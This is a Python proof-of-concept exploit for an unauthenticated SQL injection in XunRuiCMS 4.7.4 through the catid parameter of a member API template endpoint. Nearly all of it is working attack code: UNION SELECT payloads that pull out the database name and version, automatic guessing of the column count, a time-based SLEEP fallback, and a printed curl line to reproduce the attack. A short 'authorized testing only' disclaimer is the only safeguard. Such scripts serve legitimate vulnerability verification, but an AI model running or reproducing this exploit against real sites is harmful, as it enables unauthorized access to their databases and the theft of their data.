#!/usr/bin/env python3
"""
XunRuiCMS 4.7.4 - unauthenticated SQL injection (CWE-89)

Entry point
    GET /index.php?s=member&c=api&m=template&name=search.html&module=news&catid=<PAYLOAD>

Why it works
    App/Member/Controllers/Api.php::template() assigns every GET parameter to the
    template without casting catid. The bundled template compiles
        {module catid=$catid order=hits num=10}
    into a list_tag() call, and list_tag() treats the where='...' fragment inside
    the tag as a raw SQL condition:

        SELECT * FROM `dr_1_news` WHERE 1=1 AND 1=2 UNION SELECT ... # ... LIMIT 10

    The UNION row is rendered by the template sidebar, so the response carries the
    injected data.

Usage
    python poc.py --url http://TARGET
    python poc.py --url http://TARGET --columns 18      # sites with demo content
    python poc.py --url http://TARGET --blind           # force the time-based check

Requires Python 3.8+ and the standard library only.
For testing systems you own or are authorized to test.
"""

import argparse
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BANNER = """
  XunRuiCMS 4.7.4 - unauthenticated SQL injection
  entry: /index.php?s=member&c=api&m=template
  for authorized testing only
"""

# Sidebar renders title (15 chars) and description (50 chars), enough for db name and version.
MARK_DB = "0x7e44422d"     # ~DB-
MARK_VER = "0x7e5645522d"  # ~VER-
RE_DB = re.compile(r"~DB-([^~<]{1,64})~")
RE_VER = re.compile(r"~VER-([^~<]{1,80})~")

# Clean install has 17 columns; demo content adds one; custom fields add more.
COLUMN_CANDIDATES = [17, 18, 16, 19, 20, 15, 21, 22]


class Client:
    def __init__(self, base, module="news", timeout=20, verbose=False):
        self.base = base.rstrip("/")
        self.module = module
        self.timeout = timeout
        self.verbose = verbose
        self.requests = 0

    def url(self, catid, template="search.html"):
        query = [
            ("s", "member"),
            ("c", "api"),
            ("m", "template"),
            ("name", template),
            ("module", self.module),
            ("catid", catid),
        ]
        return self.base + "/index.php?" + urllib.parse.urlencode(query, quote_via=urllib.parse.quote)

    def get(self, catid, template="search.html"):
        request = urllib.request.Request(
            self.url(catid, template),
            headers={"User-Agent": "Mozilla/5.0 XunRui-SQLi-PoC", "Connection": "close"},
        )
        started = time.time()
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                body, code = response.read(), response.status
        except urllib.error.HTTPError as error:
            body, code = error.read(), error.code
        except Exception as error:  # noqa: BLE001 - network errors are reported, not raised
            body, code = str(error).encode(), 0
        elapsed = time.time() - started
        self.requests += 1
        if self.verbose:
            sys.stderr.write("[req %d] %.2fs code=%s len=%d\n" % (self.requests, elapsed, code, len(body)))
        return elapsed, code, body


def union_payload(columns):
    """Build a UNION with the db name in column 3 and the version in column 6."""
    values = ["1", "1", "CONCAT(%s,database(),0x7e)" % MARK_DB]
    values += ["1"] * (columns - 3)
    if columns >= 6:
        values[5] = "CONCAT(%s,@@version,0x7e)" % MARK_VER
    return "1=1 AND 1=2 UNION SELECT " + ",".join(values) + " #"


def try_union(client, columns):
    catid = "1 where='%s'" % union_payload(columns)
    _, code, body = client.get(catid)
    text = body.decode("utf-8", "replace")
    db = RE_DB.search(text)
    version = RE_VER.search(text)
    return {
        "hit": bool(db),
        "db": db.group(1) if db else "",
        "version": version.group(1) if version else "",
        "code": code,
        "catid": catid,
    }


def blind_check(client, delay):
    """Compare a plain request with one that sleeps inside the injected condition."""
    baseline = client.get("1")[0]
    injected = client.get("1 where='1=1 AND SLEEP(%s)'" % delay)[0]
    print("    baseline %.2fs / injected %.2fs" % (baseline, injected))
    return injected >= delay * 1.5 and baseline < delay


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="XunRuiCMS 4.7.4 unauthenticated SQL injection verifier")
    parser.add_argument("--url", required=True, help="site root, e.g. http://TARGET")
    parser.add_argument("--module", default="news", help="content module directory name (default: news)")
    parser.add_argument("--columns", type=int, default=0, help="module table column count (default: auto)")
    parser.add_argument("--delay", type=float, default=0.25, help="SLEEP seconds for the time-based check")
    parser.add_argument("--timeout", type=int, default=20, help="HTTP timeout in seconds")
    parser.add_argument("--blind", action="store_true", help="skip the UNION path, use the time-based check")
    parser.add_argument("-v", "--verbose", action="store_true", help="log every request")
    args = parser.parse_args()

    client = Client(args.url, args.module, args.timeout, args.verbose)
    print("[*] Target : %s" % client.base)
    print("[*] Entry  : /index.php?s=member&c=api&m=template&name=search.html")
    print("[*] Module : %s" % client.module)

    if args.blind:
        print("[*] Mode   : time-based\n")
        result = None
    else:
        print("[*] Mode   : UNION (single request)\n")
        columns = [args.columns] if args.columns else COLUMN_CANDIDATES
        result = None
        for count in columns:
            outcome = try_union(client, count)
            print("    columns %-2d  HTTP %-3s  %s  %s" % (
                count, outcome["code"], "hit " if outcome["hit"] else "miss", outcome["db"]))
            if outcome["hit"]:
                result = outcome
                break

    if result:
        print("\n[+] Vulnerable: unauthenticated SQL injection")
        print("    database : %s" % result["db"])
        if result["version"]:
            print("    version  : %s" % result["version"])
        print("\n[+] Reproduce:")
        print('    curl -s "%s"' % client.url(result["catid"]))
    else:
        if not args.blind:
            print("\n[-] No UNION reflection; the template may have been edited")
        print("[*] Falling back to the time-based check")
        if not blind_check(client, args.delay):
            print("[-] Not vulnerable, or the endpoint is unreachable")
            return 2
        print("[+] Vulnerable: unauthenticated SQL injection (time-based)")

    print("\n[*] %d request(s)" % client.requests)
    return 0


if __name__ == "__main__":
    sys.exit(main())
